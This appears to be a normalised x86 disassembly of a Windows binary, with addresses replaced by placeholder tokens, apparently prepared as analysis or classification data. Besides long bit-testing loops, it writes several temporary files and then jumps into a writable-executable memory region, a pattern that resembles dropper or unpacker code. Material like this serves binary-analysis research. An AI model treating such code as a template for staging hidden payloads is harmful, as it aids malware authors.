mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x14 ]
mov ecx [ edx * 4 + rwxdata ]
cmp ecx [ eax * 4 + rwxdata ]
jne r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x54 ]
add eax 0x1
mov [ ebp - 0x54 ] eax
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x14 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
jmp r-xdata
mov edx [ rwxdata ]
sub edx 0x1
cmp [ ebp - 0x14 ] edx
jne r-xdata
mov ecx [ ebp - 0x30 ]
or ecx 0x8
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x14 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x54 ]
shl eax 0x3
sar eax 0xf
and eax 0x1
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov eax [ rwxdata ]
sub eax 0x1
cmp [ ebp - 0x14 ] eax
jne r-xdata
mov edx [ ebp - 0x30 ]
or edx 0x8
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x14 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
jmp r-xdata
mov eax [ rwxdata ]
sub eax 0x1
cmp [ ebp - 0x14 ] eax
jne r-xdata
mov edx [ ebp - 0x30 ]
or edx 0x40
mov [ ebp - 0x30 ] edx
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x54 ]
add eax 0x1
mov [ ebp - 0x54 ] eax
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
jmp r-xdata
mov ecx [ rwxdata ]
sub ecx 0x1
cmp [ ebp - 0x14 ] ecx
jne r-xdata
mov eax [ ebp - 0x30 ]
or eax 0x4
mov [ ebp - 0x30 ] eax
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
jmp r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp - 0x54 ]
shl edx 0x4
sar edx 0xf
and edx 0x1
je r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ rwxdata ]
sub edx 0x1
cmp [ ebp - 0x14 ] edx
jne r-xdata
mov ecx [ ebp - 0x30 ]
or ecx 0x4
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x14 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
jmp r-xdata
mov edx [ rwxdata ]
sub edx 0x1
cmp [ ebp - 0x14 ] edx
jne r-xdata
mov ecx [ ebp - 0x30 ]
or ecx 0x20
mov [ ebp - 0x30 ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp - 0x54 ]
shl ecx 0x5
sar ecx 0xf
and ecx 0x1
je r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x14 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
jmp r-xdata
mov eax [ rwxdata ]
sub eax 0x1
cmp [ ebp - 0x14 ] eax
jne r-xdata
mov edx [ ebp - 0x30 ]
or edx 0x2
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x14 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
jmp r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp - 0x54 ]
shl eax 0x6
sar eax 0xf
and eax 0x1
je r-xdata
mov ecx [ rwxdata ]
sub ecx 0x1
cmp [ ebp - 0x14 ] ecx
jne r-xdata
mov eax [ ebp - 0x30 ]
or eax 0x2
mov [ ebp - 0x30 ] eax
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
jmp r-xdata
mov ecx [ rwxdata ]
sub ecx 0x1
cmp [ ebp - 0x14 ] ecx
jne r-xdata
mov eax [ ebp - 0x30 ]
or eax 0x10
mov [ ebp - 0x30 ] eax
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp - 0x54 ]
shl edx 0x7
sar edx 0xf
and edx 0x1
je r-xdata
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x14 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov ecx [ ebp - 0x30 ]
or ecx 0x1
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x14 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
jmp r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp - 0x54 ]
shl ecx 0x8
sar ecx 0xf
and ecx 0x1
je r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov edx [ ebp - 0x30 ]
or edx 0x1
mov [ ebp - 0x30 ] edx
mov edx [ ebp - 0x14 ]
cmp edx [ rwxdata ]
jge r-xdata
mov eax [ rwxdata ]
sub eax 0x1
cmp [ ebp - 0x14 ] eax
jne r-xdata
mov edx [ ebp - 0x30 ]
or edx 0x8
mov [ ebp - 0x30 ] edx
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp - 0x54 ]
shl eax 0x9
sar eax 0xf
and eax 0x1
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ rwxdata ]
jge r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
jmp r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp - 0x54 ]
shl edx 0xa
sar edx 0xf
and edx 0x1
je r-xdata
mov edx [ rwxdata ]
sub edx 0x1
cmp [ ebp - 0x14 ] edx
jne r-xdata
mov ecx [ ebp - 0x30 ]
or ecx 0x4
mov [ ebp - 0x30 ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp - 0x54 ]
shl ecx 0xb
sar ecx 0xf
and ecx 0x1
je r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x14 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
jmp r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp - 0x54 ]
shl eax 0xc
sar eax 0xf
and eax 0x1
je r-xdata
mov ecx [ rwxdata ]
sub ecx 0x1
cmp [ ebp - 0x14 ] ecx
jne r-xdata
mov eax [ ebp - 0x30 ]
or eax 0x2
mov [ ebp - 0x30 ] eax
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp - 0x54 ]
shl edx 0xd
sar edx 0xf
and edx 0x1
je r-xdata
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x14 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
jmp r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp - 0x54 ]
shl ecx 0xe
sar ecx 0xf
and ecx 0x1
je r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov edx [ ebp - 0x30 ]
or edx 0x1
mov [ ebp - 0x30 ] edx
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp - 0x54 ]
shl eax 0xf
sar eax 0xf
and eax 0x1
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ rwxdata ]
jge r-xdata
mov edx [ rwxdata ]
add edx 0xd
mov [ rwxdata ] edx
sub_4065b0
push ebp
mov ebp esp
sub esp 0x12c
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0xc ] eax
push esi
push edi
cmp [ rwxdata ] 0x64
jge r-xdata
mov [ ebp - 0x120 ] 0x0
mov [ ebp - 0x128 ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov [ rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
call sub_4065b0
mov eax [ rwxdata ]
sub eax 0x1
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ rwxdata ] 0x0
mov ecx [ ebp - 0x128 ]
push ecx
call sub_403250
add esp 0x4
mov [ ebp - 0x128 ] eax
mov edx [ ebp - 0x120 ]
add edx 0x1
mov [ ebp - 0x120 ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
cmp [ ebp - 0x128 ] 0xffffffff
je r-xdata
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x8 ]
imul edx edx 0x18
mov eax [ ebp - 0x8 ]
imul eax eax 0x18
mov ecx [ edx + rwxdata ]
cmp ecx [ eax + rwxdata ]
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ rwxdata ]
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1
imul edx edx 0x18
mov eax [ ebp - 0x8 ]
imul eax eax 0x18
mov ecx [ edx + rwxdata ]
mov [ eax + rwxdata ] ecx
mov [ rwxdata ] 0x0
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
sub ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x8 ]
cmp edx [ rwxdata ]
jge r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0xf
jmp r-xdata
cmp [ rwxdata ] 0x64
jge r-xdata
mov [ ebp - 0x11c ] 0x0
mov eax [ ebp - 0x8 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
lea eax [ ebp - 0x118 ]
push eax
push 0x103
call [ GetTempPathA@IAT ]
push rwxdata
push 0x0
push r--data
lea ecx [ ebp - 0x118 ]
push ecx
call [ GetTempFileNameA@IAT ]
push r--data
push rwxdata
call sub_40ba8a
add esp 0x8
mov [ ebp - 0x124 ] eax
mov edx [ ebp - 0x124 ]
push edx
mov eax [ r--data ]
push eax
push 0x1
push rwxdata
call sub_40bc8a
add esp 0x10
mov ecx [ ebp - 0x124 ]
push ecx
call sub_40c09d
add esp 0x4
push rwxdata
push 0x0
push r--data
lea edx [ ebp - 0x118 ]
push edx
call [ GetTempFileNameA@IAT ]
push r--data
push rwxdata
call sub_40ba8a
add esp 0x8
mov [ ebp - 0x124 ] eax
mov eax [ ebp - 0x124 ]
push eax
mov ecx [ r--data ]
push ecx
push 0x1
push rwxdata
call sub_40bc8a
add esp 0x10
mov edx [ ebp - 0x124 ]
push edx
call sub_40c09d
add esp 0x4
push rwxdata
push 0x0
push r--data
lea eax [ ebp - 0x118 ]
push eax
call [ GetTempFileNameA@IAT ]
push r--data
push rwxdata
call sub_40ba8a
add esp 0x8
mov [ ebp - 0x124 ] eax
mov ecx [ ebp - 0x124 ]
push ecx
mov edx [ r--data ]
push edx
push 0x1
push rwxdata
call sub_40bc8a
add esp 0x10
mov eax [ ebp - 0x124 ]
push eax
call sub_40c09d
add esp 0x4
push rwxdata
push 0x0
push r--data
lea ecx [ ebp - 0x118 ]
push ecx
call [ GetTempFileNameA@IAT ]
push r--data
push rwxdata
call sub_40ba8a
add esp 0x8
mov [ ebp - 0x124 ] eax
mov edx [ ebp - 0x124 ]
push edx
mov eax [ r--data ]
push eax
push 0x1
push rwxdata
call sub_40bc8a
add esp 0x10
mov ecx [ ebp - 0x124 ]
push ecx
call sub_40c09d
add esp 0x4
push rwxdata
push 0x0
push r--data
lea edx [ ebp - 0x118 ]
push edx
call [ GetTempFileNameA@IAT ]
push r--data
push rwxdata
call sub_40ba8a
add esp 0x8
mov [ ebp - 0x124 ] eax
mov eax [ ebp - 0x124 ]
push eax
mov ecx [ r--data ]
push ecx
push 0x1
push rwxdata
call sub_40bc8a
add esp 0x10
mov edx [ ebp - 0x124 ]
push edx
call sub_40c09d
add esp 0x4
call sub_408da0
push rwxdata
call sub_40b98b
add esp 0x4
push rwxdata
call sub_40b98b
add esp 0x4
push rwxdata
call sub_40b98b
add esp 0x4
push rwxdata
call sub_40b98b
add esp 0x4
push rwxdata
call sub_40b98b
add esp 0x4
mov esp [ rwxdata ]
mov ebp [ rwxdata ]
mov ecx [ rwxdata ]
mov edx [ rwxdata ]
mov esi [ rwxdata ]
mov edi [ rwxdata ]
lea eax [ rwxdata ]
jmp eax
xor eax eax
jmp r-xdata
mov eax [ rwxdata ]
sub eax 0x1
cmp [ ebp - 0x8 ] eax
jne r-xdata
mov edx [ ebp - 0x11c ]
or edx 0x80
mov [ ebp - 0x11c ] edx
jmp r-xdata
mov ecx 0xf
sub ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ edx * 4 + rwxdata ]
shl eax cl
sar eax 0xf
and eax 0x1
je r-xdata
pop edi
pop esi
mov ecx [ ebp - 0xc ]
xor ecx ebp
call sub_40b762
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x8 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov edx [ rwxdata ]
sub edx 0x1
cmp [ ebp - 0x8 ] edx
jne r-xdata
mov ecx [ ebp - 0x11c ]
or ecx 0x40
mov [ ebp - 0x11c ] ecx
mov eax [ ebp - 0x4 ]
sub eax 0x1
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
jmp r-xdata
mov ecx [ rwxdata ]
sub ecx 0x1
cmp [ ebp - 0x8 ] ecx
jne r-xdata
mov eax [ ebp - 0x11c ]
or eax 0x20
mov [ ebp - 0x11c ] eax
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
jmp r-xdata
mov eax [ rwxdata ]
sub eax 0x1
cmp [ ebp - 0x8 ] eax
jne r-xdata
mov edx [ ebp - 0x11c ]
or edx 0x10
mov [ ebp - 0x11c ] edx
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x8 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
jmp r-xdata
mov edx [ rwxdata ]
sub edx 0x1
cmp [ ebp - 0x8 ] edx
jne r-xdata
mov ecx [ ebp - 0x11c ]
or ecx 0x8
mov [ ebp - 0x11c ] ecx
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
jmp r-xdata
mov ecx [ rwxdata ]
sub ecx 0x1
cmp [ ebp - 0x8 ] ecx
jne r-xdata
mov eax [ ebp - 0x11c ]
or eax 0x4
mov [ ebp - 0x11c ] eax
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
jmp r-xdata
mov eax [ rwxdata ]
sub eax 0x1
cmp [ ebp - 0x8 ] eax
jne r-xdata
mov edx [ ebp - 0x11c ]
or edx 0x2
mov [ ebp - 0x11c ] edx
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x8 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov ecx [ ebp - 0x11c ]
or ecx 0x1
mov [ ebp - 0x11c ] ecx
mov edx [ ebp - 0x8 ]
cmp edx [ rwxdata ]
jge r-xdata
sub_406bf0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
shl eax 0x8
sar eax 0xf
and eax 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
shl edx 0x9
sar edx 0xf
and edx 0x1
je r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
shl ecx 0xa
sar ecx 0xf
and ecx 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0xb
sar eax 0xf
and eax 0x1
je r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
shl edx 0xc
sar edx 0xf
and edx 0x1
je r-xdata
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x0
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x1
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
shl ecx 0xd
sar ecx 0xf
and ecx 0x1
je r-xdata
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x0
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
mov ecx [ rwxdata ]
mov [ ecx + rwxdata ] 0x1
mov edx [ rwxdata ]
add edx 0x1
mov [ rwxdata ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0xe
sar eax 0xf
and eax 0x1
je r-xdata
mov edx [ rwxdata ]
mov [ edx + rwxdata ] 0x0
mov eax [ rwxdata ]
add eax 0x1
mov [ rwxdata ] eax
mov eax [ rwxdata ]
mov [ eax + rwxdata ] 0x1
mov ecx [ rwxdata ]
add ecx 0x1
mov [ rwxdata ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
shl edx 0xf
sar edx 0xf
and edx 0x1
je r-xdata
pop ebp
retn
sub_406e30
push ebp
mov ebp esp
sub esp 0x68
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x24 ] eax
push r--data
push rwxdata
call sub_40ba8a
add esp 0x8
mov [ rwxdata ] eax
cmp [ rwxdata ] 0x0
jne r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ rwxdata ]
push ecx
call sub_40bfa1
add esp 0xc
mov [ rwxdata ] 0x0
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x20 ] edx
mov eax [ rwxdata ]
push eax
call sub_40c21d
add esp 0x4
mov [ ebp - 0xc ] eax
xor eax eax
jmp r-xdata
mov eax [ rwxdata ]
push eax
call sub_40c09d
add esp 0x4
mov [ rwxdata ] 0x0
mov [ ebp - 0x20 ] 0x0
mov edx [ ebp - 0xc ]
push edx
call sub_406bf0
add esp 0x4
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ rwxdata ]
push ecx
call sub_40bea9
add esp 0x4
cmp eax [ ebp + 0xc ]
jne r-xdata
mov ecx [ ebp - 0x24 ]
xor ecx ebp
call sub_40b762
mov esp ebp
pop ebp
retn
push r--data
push rwxdata
call sub_40ba8a
add esp 0x8
mov [ rwxdata ] eax
cmp [ rwxdata ] 0x0
jne r-xdata
mov [ ebp - 0x1c ] 0x0
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov edx [ rwxdata ]
push edx
call sub_40c21d
add esp 0x4
mov [ ebp - 0xc ] eax
jmp r-xdata
jmp r-xdata
push 0x0
mov ecx [ ebp + 0x18 ]
push ecx
mov edx [ rwxdata ]
push edx
call sub_40bfa1
add esp 0xc
mov [ rwxdata ] 0x0
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x20 ] eax
mov ecx [ rwxdata ]
push ecx
call sub_40c21d
add esp 0x4
mov [ ebp - 0xc ] eax
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x1c ]
or ecx 0x1000
mov [ ebp - 0x1c ] ecx
mov ecx [ rwxdata ]
push ecx
call sub_40b923
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ rwxdata ]
push ecx
call sub_40c09d
add esp 0x4
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x44 ] 0x0
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0xc ]
push eax
call sub_406bf0
add esp 0x4
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ rwxdata ]
push edx
call sub_40bea9
add esp 0x4
cmp eax [ ebp + 0x1c ]
jne r-xdata
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x1c ]
or edx 0x800
mov [ ebp - 0x1c ] edx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x44 ]
or ecx 0x4
mov [ ebp - 0x44 ] ecx
mov eax [ rwxdata ]
push eax
call sub_40c21d
add esp 0x4
mov [ ebp - 0xc ] eax
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
or eax 0x400
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x44 ]
or edx 0x2
mov [ ebp - 0x44 ] edx
mov edx [ rwxdata ]
push edx
call sub_40b923
add esp 0x4
test eax eax
jne r-xdata
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x1c ]
or ecx 0x200
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp - 0x20 ]
add ecx 0x1
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] 0x0
mov edx [ ebp - 0x20 ]
movzx eax [ edx + rwxdata ]
test eax eax
je r-xdata
mov eax [ ebp - 0x44 ]
or eax 0x1
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x20 ]
add eax 0x1
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
movzx edx [ ecx + rwxdata ]
test edx edx
je r-xdata
mov edx [ ebp - 0x1c ]
or edx 0x100
mov [ ebp - 0x1c ] edx
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x20 ]
movzx ecx [ eax + rwxdata ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x18 ]
or ecx 0x4
mov [ ebp - 0x18 ] ecx
mov ecx [ ebp - 0x20 ]
add ecx 0x1
